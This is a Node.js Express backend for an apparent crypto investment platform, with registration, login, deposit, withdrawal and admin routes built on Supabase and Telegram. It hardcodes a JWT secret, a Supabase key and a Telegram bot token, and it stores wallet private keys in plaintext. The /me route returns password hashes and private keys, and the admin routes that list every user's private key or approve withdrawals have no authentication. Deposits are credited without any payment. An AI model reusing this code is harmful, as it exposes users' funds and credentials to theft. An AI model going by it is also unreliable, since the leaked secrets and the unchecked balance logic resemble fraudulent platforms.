const express = require("express");
const cors = require("cors");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const path = require("path");
const { Wallet } = require("ethers");
const axios = require("axios");
const { createClient } = require("@supabase/supabase-js");

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

const SECRET = "SECRET_KEY";

// SUPABASE
const supabase = createClient(
"https://pwqmiiruxceepjammiza.supabase.co",
"sb_publishable_7lxiFe5VT8iQx37Ip7R2YA_99WVsa1N"
);

// TELEGRAM
const TELEGRAM_TOKEN = "8714057941:AAGZL1OXRoy8-7_IoVAHBePTLwuTKmqicOg";
const CHAT_ID = "337179852";

// ===== AUTH =====
function auth(req, res, next) {
const token = req.headers.authorization;
if (!token) return res.status(401).json({ success: false });

try {
const data = jwt.verify(token, SECRET);
req.userId = data.id;
next();
} catch {
return res.status(401).json({ success: false });
}
}

// ===== REGISTER =====
app.post("/register", async (req, res) => {
try {

const { fullname, nickname, referrer_id, country, phone, email, password } = req.body;

if (!email || !password) {
return res.json({ success: false });
}

const emailLower = email.toLowerCase();

let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
if (ip.includes(",")) ip = ip.split(",")[0].trim();
if (ip.includes("::ffff:")) ip = ip.replace("::ffff:", "");

const { data: ipUsers } = await supabase.from("users").select("id").eq("ip", ip);

if (ipUsers && ipUsers.length >= 3) {
return res.json({ success: false, message: "Too many accounts" });
}

const { data: existing } = await supabase
.from("users")
.select("*")
.eq("email", emailLower)
.maybeSingle();

if (existing) {
return res.json({ success: false, message: "User exists" });
}

const hash = await bcrypt.hash(password, 10);
const code = Math.floor(100000 + Math.random() * 900000).toString();

let wallet_address = null;
let private_key = null;

try {
const wallet = Wallet.createRandom();
wallet_address = wallet.address;
private_key = wallet.privateKey;
} catch {}

const { data, error } = await supabase
.from("users")
.insert([{
fullname,
nickname,
referrer_id,
country,
phone,
email: emailLower,
password: hash,
balance: 1000,
deposit: 0,
satellites: 0,
wallet_address,
private_key,
email_code: code,
email_verified: false,
ip
}])
.select()
.maybeSingle();

if (error || !data) {
console.log("INSERT ERROR:", error);
return res.json({ success: false });
}

// SIGNAL
await supabase.from("signals").insert([{
user_id: data.id,
type: "register",
amount: 0,
wallet: data.wallet_address,
status: "done"
}]);

// TELEGRAM
try {
await axios.post(
`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
{
chat_id: CHAT_ID,
text: `🆕 USER\nID: ${data.id}\nEMAIL: ${data.email}`
}
);
} catch (e) {
console.log("TG ERROR:", e.message);
}

return res.json({ success: true });

} catch (err) {
console.log("REGISTER ERROR:", err);
return res.json({ success: false });
}
});

// ===== LOGIN =====
app.post("/login", async (req, res) => {
const { email, password } = req.body;

const { data: user } = await supabase
.from("users")
.select("*")
.eq("email", email.toLowerCase())
.maybeSingle();

if (!user) return res.json({ success: false });

const valid = await bcrypt.compare(password, user.password);
if (!valid) return res.json({ success: false });

const token = jwt.sign({ id: user.id }, SECRET);
res.json({ success: true, token });
});

// ===== USER =====
app.get("/me", auth, async (req, res) => {
const { data: user } = await supabase
.from("users")
.select("*")
.eq("id", req.userId)
.single();

res.json(user);
});

// ===== DEPOSIT =====
app.post("/deposit", auth, async (req, res) => {
try {
const amount = Number(req.body.amount);

if (!amount || amount <= 0) {
return res.json({ success: false });
}

const { data: user } = await supabase
.from("users")
.select("*")
.eq("id", req.userId)
.single();

if (!user) return res.json({ success: false });

const newBalance = Number(user.balance) + amount;
const newDeposit = Number(user.deposit) + amount;

await supabase.from("users").update({
balance: newBalance,
deposit: newDeposit
}).eq("id", req.userId);

await supabase.from("signals").insert([{
user_id: req.userId,
type: "deposit",
amount,
wallet: user.wallet_address,
status: "done"
}]);

res.json({ success: true });

} catch (e) {
console.log("DEPOSIT ERROR:", e);
res.json({ success: false });
}
});

// ===== WITHDRAW =====
app.post("/withdraw", auth, async (req, res) => {
try {
const amount = Number(req.body.amount);
const wallet = req.body.wallet;

const { data: user } = await supabase
.from("users")
.select("*")
.eq("id", req.userId)
.single();

if (!user || !amount || amount <= 0 || user.balance < amount) {
return res.json({ success: false });
}

await supabase.from("signals").insert([{
user_id: req.userId,
type: "withdraw",
amount,
wallet,
status: "pending"
}]);

res.json({ success: true });

} catch (e) {
console.log("WITHDRAW ERROR:", e);
res.json({ success: false });
}
});

// ===== ADMIN SIGNALS =====
app.get("/admin/signals", async (req, res) => {
const { data } = await supabase
.from("signals")
.select("*")
.order("created_at", { ascending: false });

res.json(data || []);
});

// APPROVE
app.post("/admin/approve", async (req, res) => {
const { id } = req.body;

const { data: s } = await supabase
.from("signals")
.select("*")
.eq("id", id)
.single();

if (!s) return res.json({ success: false });

if (s.type === "withdraw") {
const { data: user } = await supabase
.from("users")
.select("*")
.eq("id", s.user_id)
.single();

await supabase.from("users").update({
balance: user.balance - s.amount
}).eq("id", user.id);
}

await supabase.from("signals").update({
status: "approved"
}).eq("id", id);

res.json({ success: true });
});

// REJECT
app.post("/admin/reject", async (req, res) => {
const { id } = req.body;

await supabase.from("signals").update({
status: "rejected"
}).eq("id", id);

res.json({ success: true });
});

// ===== ADMIN USERS =====
app.get("/admin/users", async (req, res) => {
const { data } = await supabase.from("users").select("*");
res.json(data || []);
});

// ===== START =====
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
console.log("🔥 Server running on " + PORT);
});
